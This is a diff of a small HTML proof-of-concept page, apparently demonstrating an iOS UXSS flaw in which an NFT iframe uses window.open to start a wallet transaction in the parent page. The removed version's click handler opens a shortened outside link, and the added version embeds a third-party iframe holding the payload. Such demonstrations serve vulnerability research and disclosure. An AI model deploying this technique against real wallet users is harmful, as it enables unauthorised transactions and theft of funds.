@@ -1,37 +1,5 @@
-<!doctype html>
-<html>
-<head>
-    <style>
-        html {
-            font-family: sans-serif;
-        }
-        h1 {
-            font-size: 1.4em;
-        }
-    </style>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
-<body>
-<h1>iframe on <span id="originOutput"></span></h1>
-
-<p>
-    Tap/click this iframe, which will call the provided URL to send a transaction in the parent page context.
-    (Observe the transaction being initiated)
-</p>
-
-<p>This is an NFT shown through an iframe due to SOP; the NFTs should never get access to the parent domain</p>
-
-<p><b>IN SOP WE TRUST</b></p>
-
-<img src="https://agentjacker.github.io/kittycat.png">
-
-<script>
-    document.getElementById('originOutput').innerText = window.location.origin;
-
-    document.body.addEventListener('click', function () {
-        http://window.open('https://t.co/WXRjkSVLtb');
-    });
-</script>
-
-</body>
-</html>
+<html><head> <style>        html {            font-family: sans-serif;        }        h1 {            font-size: 1.8em;            margin-bottom: 0;        }        p {            margin: 5px 0;        }        #testFrame {            width: 95vw;            height: 350px;        } </style> <meta name="viewport" content="width=device-width, initial-scale=1.0"></head><body><h1>Dapp PoC</h1><h1>IOS Uxss via http://window.open()</h1> <p><b>We trust the SOP to ensure no malicious content from the nfts affect the parent domain you are safe</b></p>
+<p>Parent page on <span id="originOutput"></span></p>
+<iframe id="testFrame" src="https://g0ziem.github.io/meta4.html"></iframe>
+<script>    document.getElementById('originOutput').innerText = window.location.origin;</script>
+</body></html>
